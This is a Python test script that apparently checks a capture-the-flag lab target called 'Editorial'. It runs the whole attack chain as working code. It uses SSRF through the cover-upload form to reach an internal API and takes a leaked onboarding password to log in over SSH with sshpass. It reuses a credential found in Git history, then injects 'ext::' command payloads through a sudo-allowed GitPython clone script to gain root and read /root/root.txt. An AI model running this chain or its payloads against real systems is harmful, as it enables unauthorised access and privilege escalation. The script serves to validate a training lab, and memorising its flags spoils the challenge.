#!/usr/bin/env python3
"""Non-destructive tests from an independent Docker network peer."""
import json
import os
import re
import subprocess
import socket
import urllib.error
import urllib.parse
import urllib.request

HOST = "editorial-target"
BASE = "http://" + HOST

def get(path):
    with urllib.request.urlopen(BASE + path, timeout=6) as res:
        assert res.status == 200
        return res.read()

def preview(url):
    data = urllib.parse.urlencode({"bookurl": url}).encode("utf-8")
    with urllib.request.urlopen(BASE + "/upload-cover", data=data, timeout=8) as res:
        assert res.status == 200
        return res.read().decode("utf-8").strip()

assert b"Editorial Tiempo Arriba" in get("/")
assert b'name="bookurl"' in get("/upload")
assert b"ideas" in get("/about")
assert json.loads(get("/healthz"))["status"] == "ok"
with socket.create_connection((HOST, 22), timeout=5) as connection:
    assert connection.recv(32).startswith(b"SSH-2.0-")
print("PASS: publisher site, submission form, health, and native SSH banner", flush=True)

try:
    socket.create_connection((HOST, 5000), timeout=2)
except OSError:
    pass
else:
    raise AssertionError("Loopback API exposed on external network")
try:
    get("/api/latest/metadata")
except urllib.error.HTTPError as e:
    assert e.code == 404
else:
    raise AssertionError("Private API is served on the public site")
print("PASS: internal API is unreachable directly", flush=True)

assert "placeholder" in preview("http://127.0.0.1:4999/")
path = preview("http://127.0.0.1:5000/")
assert path.startswith("/static/uploads/"), path
response = json.loads(get(path))
assert response["service"] == "Editorial API"
assert "/api/latest/metadata/messages/authors" in response["links"]
path2 = preview("http://127.0.0.1:5000/api/latest/metadata")
assert path2.startswith("/static/uploads/")
metadata = json.loads(get(path2))
assert "/api/latest/metadata/messages/authors" in metadata["routes"]
print("PASS: genuine SSRF with outbound local HTTP, stored response bytes and API discovery", flush=True)

# The leaked onboarding password must work against the actual SSH server.
msg_path = preview("http://127.0.0.1:5000/api/latest/metadata/messages/authors")
message = json.loads(get(msg_path))["messages"][0]["body"]
password_match = re.search(r"Temporary password: ([^\\s.]+)", message)
assert password_match, "Internal API no longer exposes onboarding information"
env = os.environ.copy()
env["SSHPASS"] = password_match.group(1)
ssh_result = subprocess.run([
    "sshpass", "-e", "ssh", "-T",
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", "PreferredAuthentications=password",
    "-o", "PubkeyAuthentication=no",
    "-o", "ConnectTimeout=5",
    "dev@" + HOST,
    "id -un; cat /home/dev/user.txt; git -C /home/dev/apps rev-list --count HEAD",
], capture_output=True, text=True, env=env, timeout=15)
assert ssh_result.returncode == 0, (ssh_result.stdout, ssh_result.stderr)
assert ssh_result.stdout.splitlines() == ["dev", "TTP{ci_user_first_instance}", "2"], ssh_result.stdout
print("PASS: private API onboarding information authenticates to SSH and retrieves User flag", flush=True)

# Continue as an outside player: the second account comes from an actual
# historical Git commit, not a hard-coded CI password.
def ssh_as(username, password, command):
    local_env = os.environ.copy()
    local_env["SSHPASS"] = password
    return subprocess.run([
        "sshpass", "-e", "ssh", "-T",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "PreferredAuthentications=password",
        "-o", "PubkeyAuthentication=no",
        "-o", "ConnectTimeout=5",
        username + "@" + HOST,
        command,
    ], capture_output=True, text=True, timeout=18, env=local_env)

history = ssh_as("dev", env["SSHPASS"], "git -C /home/dev/apps show HEAD~1:api_notes.py")
assert history.returncode == 0, (history.stdout, history.stderr)
prod_credential = re.search(r'production_password\s*=\s*"([^"]+)"', history.stdout)
assert prod_credential, "Previous Git commit does not contain the ops credential"
prod = ssh_as("prod", prod_credential.group(1), "id -un; sudo -n -l")
assert prod.returncode == 0 and "prod" in prod.stdout, (prod.stdout, prod.stderr)
assert "clone_prod_change.py" in prod.stdout, (prod.stdout, prod.stderr)
print("PASS: real Git history credential reuse, prod SSH and restricted sudo allowance", flush=True)

# The native GitPython/Git helper is intentionally exercised on the isolated
# challenge target. A marker owned by UID 0 confirms native privilege context.
probe = ssh_as(
    "prod", prod_credential.group(1),
    "sudo -n /usr/local/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::touch /tmp/editorial-gitpython-root-check'",
)
proof = ssh_as("prod", prod_credential.group(1), "stat -c %u /tmp/editorial-gitpython-root-check")
assert proof.returncode == 0 and proof.stdout.strip() == "0", (probe.stderr, proof.stderr, proof.stdout)
print("PASS: genuine GitPython clone transport executes as UID 0 through limited sudo", flush=True)

# Finally obtain the per-instance root answer using the same actual Git
# remote-ext path as the UID0 proof; never use Docker exec to read it.
for remote in (
    "ext::cp /root/root.txt /tmp/editorial-gitpython-root-answer",
    "ext::chmod 0644 /tmp/editorial-gitpython-root-answer",
):
    ssh_as(
        "prod", prod_credential.group(1),
        "sudo -n /usr/local/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py '" + remote + "'",
    )
answer = ssh_as("prod", prod_credential.group(1), "cat /tmp/editorial-gitpython-root-answer")
assert answer.returncode == 0 and answer.stdout.strip() == "TTP{ci_root_first_instance}", (answer.stdout, answer.stderr)
print("PASS: real GitPython remote-ext privilege escalation recovers the private CI Root Flag", flush=True)
